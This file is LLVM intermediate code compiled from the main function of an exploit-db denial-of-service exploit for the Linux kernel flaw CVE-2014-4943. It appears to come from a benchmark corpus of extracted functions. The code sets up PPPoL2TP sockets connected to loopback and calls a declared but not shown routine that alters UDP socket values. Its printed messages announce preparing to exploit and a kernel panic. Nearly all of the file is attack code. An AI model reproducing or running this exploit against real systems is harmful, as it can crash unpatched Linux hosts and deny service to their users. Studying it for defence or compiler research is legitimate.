; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_36267.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_36267.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_pppol2tp = type { %struct.TYPE_6__, i8*, i8* }
%struct.TYPE_6__ = type { i32, i32, i32, i32, i64, %struct.TYPE_5__ }
%struct.TYPE_5__ = type { i8*, i32, %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [40 x i8] c"[cve_2014_4943]: Preparing to exploit.\0A\00", align 1
@AF_PPPOX = common dso_local global i8* null, align 8
@SOCK_DGRAM = common dso_local global i32 0, align 4
@PX_PROTO_OL2TP = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [45 x i8] c"socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP)\00", align 1
@AF_INET = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [21 x i8] c"cannot create socket\00", align 1
@INADDR_LOOPBACK = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [15 x i8] c"connect failed\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"[cve_2014_4943]:  Panic!\0A\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"\0A [+] Closing sockets...\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_pppol2tp, align 8
  %6 = alloca %struct.sockaddr_pppol2tp, align 8
  store i32 0, i32* %1, align 4
  %7 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %8 = load i8*, i8** @AF_PPPOX, align 8
  %9 = load i32, i32* @SOCK_DGRAM, align 4
  %10 = load i8*, i8** @PX_PROTO_OL2TP, align 8
  %11 = call i32 @socket(i8* %8, i32 %9, i8* %10)
  store i32 %11, i32* %2, align 4
  %12 = load i32, i32* %2, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %16

14:                                               ; preds = %0
  %15 = call i32 @perror(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %99

16:                                               ; preds = %0
  %17 = load i8*, i8** @AF_PPPOX, align 8
  %18 = load i32, i32* @SOCK_DGRAM, align 4
  %19 = load i8*, i8** @PX_PROTO_OL2TP, align 8
  %20 = call i32 @socket(i8* %17, i32 %18, i8* %19)
  store i32 %20, i32* %3, align 4
  %21 = load i32, i32* %3, align 4
  %22 = icmp slt i32 %21, 0
  br i1 %22, label %23, label %25

23:                                               ; preds = %16
  %24 = call i32 @perror(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %99

25:                                               ; preds = %16
  %26 = load i8*, i8** @AF_INET, align 8
  %27 = load i32, i32* @SOCK_DGRAM, align 4
  %28 = call i32 @socket(i8* %26, i32 %27, i8* null)
  store i32 %28, i32* %4, align 4
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %32

30:                                               ; preds = %25
  %31 = call i32 @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %99

32:                                               ; preds = %25
  %33 = call i32 @memset(%struct.sockaddr_pppol2tp* %5, i32 0, i32 56)
  %34 = load i8*, i8** @AF_PPPOX, align 8
  %35 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 2
  store i8* %34, i8** %35, align 8
  %36 = load i8*, i8** @PX_PROTO_OL2TP, align 8
  %37 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 1
  store i8* %36, i8** %37, align 8
  %38 = load i32, i32* %4, align 4
  %39 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %40 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %39, i32 0, i32 0
  store i32 %38, i32* %40, align 8
  %41 = load i32, i32* @INADDR_LOOPBACK, align 4
  %42 = call i32 @htonl(i32 %41)
  %43 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %44 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %43, i32 0, i32 5
  %45 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %44, i32 0, i32 2
  %46 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %45, i32 0, i32 0
  store i32 %42, i32* %46, align 4
  %47 = call i32 @htons(i32 1337)
  %48 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %49 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %48, i32 0, i32 5
  %50 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %49, i32 0, i32 1
  store i32 %47, i32* %50, align 8
  %51 = load i8*, i8** @AF_INET, align 8
  %52 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %53 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %52, i32 0, i32 5
  %54 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %53, i32 0, i32 0
  store i8* %51, i8** %54, align 8
  %55 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %56 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %55, i32 0, i32 1
  store i32 8, i32* %56, align 4
  %57 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %58 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %57, i32 0, i32 2
  store i32 0, i32* %58, align 8
  %59 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %60 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %59, i32 0, i32 4
  store i64 0, i64* %60, align 8
  %61 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %5, i32 0, i32 0
  %62 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %61, i32 0, i32 3
  store i32 0, i32* %62, align 4
  %63 = load i32, i32* %2, align 4
  %64 = bitcast %struct.sockaddr_pppol2tp* %5 to %struct.sockaddr*
  %65 = call i64 @connect(i32 %63, %struct.sockaddr* %64, i32 56)
  %66 = icmp slt i64 %65, 0
  br i1 %66, label %67, label %69

67:                                               ; preds = %32
  %68 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  br label %69

69:                                               ; preds = %67, %32
  %70 = call i32 @memset(%struct.sockaddr_pppol2tp* %5, i32 0, i32 56)
  %71 = load i8*, i8** @AF_PPPOX, align 8
  %72 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %6, i32 0, i32 2
  store i8* %71, i8** %72, align 8
  %73 = load i8*, i8** @PX_PROTO_OL2TP, align 8
  %74 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %6, i32 0, i32 1
  store i8* %73, i8** %74, align 8
  %75 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %6, i32 0, i32 0
  %76 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %75, i32 0, i32 1
  store i32 8, i32* %76, align 4
  %77 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %6, i32 0, i32 0
  %78 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %77, i32 0, i32 2
  store i32 1, i32* %78, align 8
  %79 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %6, i32 0, i32 0
  %80 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %79, i32 0, i32 4
  store i64 0, i64* %80, align 8
  %81 = getelementptr inbounds %struct.sockaddr_pppol2tp, %struct.sockaddr_pppol2tp* %6, i32 0, i32 0
  %82 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %81, i32 0, i32 3
  store i32 1, i32* %82, align 4
  %83 = load i32, i32* %3, align 4
  %84 = bitcast %struct.sockaddr_pppol2tp* %6 to %struct.sockaddr*
  %85 = call i64 @connect(i32 %83, %struct.sockaddr* %84, i32 56)
  %86 = icmp slt i64 %85, 0
  br i1 %86, label %87, label %89

87:                                               ; preds = %69
  %88 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  br label %89

89:                                               ; preds = %87, %69
  %90 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  %91 = load i32, i32* %3, align 4
  %92 = call i32 @modifyUDPvalues(i32 %91)
  %93 = call i32 @puts(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0))
  %94 = load i32, i32* %2, align 4
  %95 = call i32 @close(i32 %94)
  %96 = load i32, i32* %3, align 4
  %97 = call i32 @close(i32 %96)
  %98 = call i32 @exit(i32 0) #3
  unreachable

99:                                               ; preds = %30, %23, %14
  %100 = load i32, i32* %1, align 4
  ret i32 %100
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @socket(i8*, i32, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(%struct.sockaddr_pppol2tp*, i32, i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @modifyUDPvalues(i32) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
